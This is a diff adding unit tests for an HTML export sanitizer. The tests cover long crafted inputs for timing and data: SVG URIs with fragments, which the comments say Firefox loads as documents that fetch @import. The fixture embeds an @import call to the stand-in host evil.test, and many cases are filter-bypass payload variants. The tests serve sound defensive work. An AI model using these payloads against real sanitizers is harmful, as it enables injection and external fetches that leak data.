@@ -244,6 +244,9 @@ describe('export sanitize — a long crafted value costs one pass', () => {
         ['spaces after url( in a style element', `<style>.a{b:url(${' '.repeat(LONG)}x}</style>`],
         ['spaces after url( in a presentation attribute', `<svg><rect fill="url(${' '.repeat(LONG)}x"></rect></svg>`],
         ['backslashes in a presentation attribute', `<svg><rect fill="${'\\'.repeat(LONG)}"></rect></svg>`],
+        ['an unclosed quoted data: URI', `<style>.a{b:url('data:${'a'.repeat(LONG)}}</style>`],
+        ['quoted data: url( openings', `<style>.a{b:${"url('data:".repeat(LONG / 10)}}</style>`],
+        ['unquoted data: url( openings', `<svg><rect fill="${'url(data:'.repeat(LONG / 9)}"></rect></svg>`],
     ])('%s', (_, html) => {
         const start = performance.now();
         sanitizeExportHtml(html);
@@ -573,6 +576,83 @@ describe('export sanitize — a data: URI passes as it is', () => {
         expect(sanitizeExportHtml(`<img src="${uri}">`)).toBe(`<img src="${uri}">`);
         expect(sanitizeExportHtml(`<style>.a{background:url("${uri}")}</style>`)).toBe(
             `<style>.a{background:url("${uri}")}</style>`,
+        );
+    });
+});
+
+// Firefox loads a data: SVG named with a fragment as a resource document, not an image, and fetches its @import.
+describe('export sanitize — a data: URI with a fragment is refused', () => {
+    const SVG = base64Svg(
+        '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(http://evil.test/i);</style><mask id="m"/></svg>',
+    );
+
+    test.each([
+        ['an unquoted mask', `mask:url(${SVG}#m)`],
+        ['a single-quoted clip-path', `clip-path:url('${SVG}#c')`],
+        ['a double-quoted filter', `filter:url("${SVG}#f")`],
+        ['a mask-image', `mask-image:url(${SVG}#m)`],
+        ['an uppercase DATA: after spaces', `mask:URL( '${SVG.replace('data:', 'DATA:')}#m' )`],
+        ['an empty fragment', `mask:url(${SVG}#)`],
+    ])('%s goes from a style attribute and a style element', (_, css) => {
+        expect(sanitizeExportHtml(`<div style="color:red;${css.replaceAll('"', '&quot;')}">x</div>`)).toBe(
+            '<div>x</div>',
+        );
+        expect(sanitizeExportHtml(`<style>.a{${css}}.b{color:red}</style>`)).toBe('<style>.b{color:red}</style>');
+    });
+
+    test.each(['fill', 'stroke', 'filter', 'mask', 'clip-path', 'marker-start'])(
+        'a fragment url() in an SVG %s attribute goes, inline and in SVG media',
+        (attr) => {
+            for (const value of [`url(${SVG}#x)`, `url('${SVG}#x')`, `url(${SVG}\\23 x)`]) {
+                expect(sanitizeExportHtml(`<svg><rect ${attr}="${value}"></rect></svg>`)).toBe(
+                    '<svg><rect></rect></svg>',
+                );
+                const [media] = sanitizeExportMedia([
+                    {
+                        name: 'a.svg',
+                        contentType: 'image/svg+xml',
+                        data: toTransferableText(
+                            `<svg xmlns="http://www.w3.org/2000/svg"><rect ${attr}="${value}"/></svg>`,
+                        ),
+                    },
+                ]);
+                expect(Buffer.from(media.data).toString('utf8')).not.toContain('data:');
+            }
+        },
+    );
+
+    test.each(['image', 'feImage', 'pattern', 'linearGradient', 'filter', 'textPath', 'mpath'])(
+        'a fragment href on an SVG %s goes, in both spellings',
+        (tag) => {
+            for (const attr of ['href', 'xlink:href']) {
+                const out = sanitizeExportHtml(
+                    `<svg xmlns:xlink="http://www.w3.org/1999/xlink"><${tag} ${attr}="${SVG}#g"></${tag}></svg>`,
+                );
+                expect(out).not.toContain('data:');
+            }
+        },
+    );
+
+    test('a fragment src, poster and background go', () => {
+        expect(sanitizeExportHtml(`<img src="${SVG}#g">`)).toBe('<img>');
+        expect(sanitizeExportHtml(`<video poster="${SVG}#g"></video>`)).toBe('<video></video>');
+        expect(sanitizeExportHtml(`<table background="${SVG}#g"><tbody><tr><td>x</td></tr></tbody></table>`)).toBe(
+            '<table><tbody><tr><td>x</td></tr></tbody></table>',
+        );
+    });
+
+    test('a data: URI without a fragment, or with a percent-encoded hash, keeps its reference', () => {
+        const kept = `<svg><rect fill="url(${SVG})" mask="url('${SVG}')" filter="url(${SVG}%23f)"></rect></svg>`;
+        expect(sanitizeExportHtml(kept)).toBe(kept);
+        expect(sanitizeExportHtml(`<div style="mask:url(${SVG})">x</div>`)).toBe(
+            `<div style="mask:url(${SVG})">x</div>`,
+        );
+    });
+
+    // Every fetch needs a function, and a CSS escape cannot spell the `(` that opens one.
+    test('a backslash in a presentation attribute with no paren is kept', () => {
+        expect(sanitizeExportHtml('<svg><rect fill="\\72 ed"></rect></svg>')).toBe(
+            '<svg><rect fill="\\72 ed"></rect></svg>',
         );
     });
 });
